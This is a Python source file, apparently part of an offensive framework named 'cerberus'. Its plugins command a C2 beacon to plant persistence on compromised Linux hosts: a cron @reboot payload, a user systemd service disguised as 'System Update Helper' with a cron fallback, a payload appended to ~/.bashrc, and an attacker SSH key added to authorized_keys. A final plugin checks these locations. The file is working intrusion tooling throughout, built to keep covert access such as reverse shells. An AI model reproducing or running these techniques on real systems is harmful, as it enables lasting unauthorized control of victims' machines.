"""Persistence helpers — implant-backed + local payload generators.

Techniques (Linux-focused v0.2, Windows stubs via shell):
  - cron
  - systemd user service
  - bashrc / profile
  - ssh authorized_keys
"""

from __future__ import annotations

from typing import Any

from cerberus.core.c2 import get_c2
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin

PHASES = [Phase.PRIVESC, Phase.LATERAL, Phase.EXFIL]


def _beacon_id(kwargs: dict, server) -> str | None:
    return kwargs.get("beacon") or kwargs.get("id") or (server.active_id if server else None)


@register_plugin
class PersistCronPlugin(Plugin):
    meta = PluginMeta(
        name="persist_cron",
        description="Install a cron job on beacon (cmd= payload, schedule= optional)",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["persistence"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        payload = kwargs.get("cmd") or kwargs.get("payload")
        if not payload:
            return {"success": False, "message": "need cmd= reverse shell or implant path"}
        schedule = kwargs.get("schedule") or "@reboot"
        # Write marker + install
        remote_cmd = (
            f"(crontab -l 2>/dev/null | grep -v 'cerberus-persist'; "
            f"echo '{schedule} {payload} # cerberus-persist') | crontab -"
        )
        ok = await server.task(bid, "shell", {"cmd": remote_cmd})
        self.evidence.add(
            kind="persistence",
            target=bid,
            data={"method": "cron", "schedule": schedule, "payload": payload[:200]},
            source="persist_cron",
            plugin="persist_cron",
            confidence=0.7,
            tags=["persist", "linux"],
        )
        return {"success": ok, "message": f"cron persist tasked → {bid}", "beacon": bid}


@register_plugin
class PersistSystemdPlugin(Plugin):
    meta = PluginMeta(
        name="persist_systemd",
        description="Drop a user-level systemd service on beacon (cmd= ExecStart)",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["persistence"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        payload = kwargs.get("cmd") or kwargs.get("payload")
        if not payload:
            return {"success": False, "message": "need cmd= ExecStart command"}
        name = kwargs.get("name") or "cerberus-update"
        unit = f"""[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
        # escape for shell heredoc carefully via base64 write
        import base64
        b64 = base64.b64encode(unit.encode()).decode()
        remote = (
            f"mkdir -p ~/.config/systemd/user && "
            f"echo {b64} | base64 -d > ~/.config/systemd/user/{name}.service && "
            f"systemctl --user daemon-reload 2>/dev/null; "
            f"systemctl --user enable --now {name}.service 2>/dev/null || "
            f"(crontab -l 2>/dev/null; echo '@reboot {payload} # cerberus-systemd-fallback') | crontab -"
        )
        ok = await server.task(bid, "shell", {"cmd": remote})
        self.evidence.add(
            kind="persistence",
            target=bid,
            data={"method": "systemd-user", "name": name, "payload": payload[:200]},
            source="persist_systemd",
            plugin="persist_systemd",
            confidence=0.65,
            tags=["persist", "linux"],
        )
        return {"success": ok, "message": f"systemd persist tasked → {bid}", "beacon": bid}


@register_plugin
class PersistBashrcPlugin(Plugin):
    meta = PluginMeta(
        name="persist_bashrc",
        description="Append payload to ~/.bashrc on beacon",
        phase=PHASES,
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=["persistence"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        payload = kwargs.get("cmd") or kwargs.get("payload")
        if not payload:
            return {"success": False, "message": "need cmd="}
        # idempotent marker
        remote = (
            f"grep -q 'cerberus-bashrc' ~/.bashrc 2>/dev/null || "
            f"echo '# cerberus-bashrc\\n{payload} &' >> ~/.bashrc"
        )
        ok = await server.task(bid, "shell", {"cmd": remote})
        self.evidence.add(
            kind="persistence",
            target=bid,
            data={"method": "bashrc", "payload": payload[:200]},
            source="persist_bashrc",
            plugin="persist_bashrc",
            confidence=0.6,
            tags=["persist", "linux"],
        )
        return {"success": ok, "message": f"bashrc persist tasked → {bid}", "beacon": bid}


@register_plugin
class PersistSshKeyPlugin(Plugin):
    meta = PluginMeta(
        name="persist_sshkey",
        description="Install an SSH public key into authorized_keys on beacon (pubkey=)",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["persistence"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        pubkey = kwargs.get("pubkey") or kwargs.get("cmd")
        if not pubkey:
            return {"success": False, "message": "need pubkey='ssh-ed25519 AAAA...'"}
        # sanitize newlines
        pubkey = pubkey.strip().replace("'", "")
        remote = (
            f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            f"grep -qF '{pubkey[:40]}' ~/.ssh/authorized_keys 2>/dev/null || "
            f"echo '{pubkey}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
        )
        ok = await server.task(bid, "shell", {"cmd": remote})
        self.evidence.add(
            kind="persistence",
            target=bid,
            data={"method": "authorized_keys"},
            source="persist_sshkey",
            plugin="persist_sshkey",
            confidence=0.85,
            tags=["persist", "ssh"],
        )
        return {"success": ok, "message": f"ssh key persist tasked → {bid}", "beacon": bid}


@register_plugin
class PersistCheckPlugin(Plugin):
    meta = PluginMeta(
        name="persist_check",
        description="Audit common persistence locations on beacon",
        phase=PHASES + [Phase.REPORT],
        opsec=OpsecLevel.LOW,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        remote = (
            "echo '===CRON==='; crontab -l 2>/dev/null; "
            "echo '===SYSTEMD-USER==='; ls ~/.config/systemd/user/ 2>/dev/null; "
            "echo '===BASHRC==='; grep -n cerberus ~/.bashrc 2>/dev/null; "
            "echo '===SSHKEYS==='; wc -l ~/.ssh/authorized_keys 2>/dev/null; "
            "echo '===RCLOCAL==='; grep -v '^#' /etc/rc.local 2>/dev/null | head"
        )
        ok = await server.task(bid, "shell", {"cmd": remote})
        return {"success": ok, "message": f"persist_check tasked → {bid} (use c2_results)", "beacon": bid}
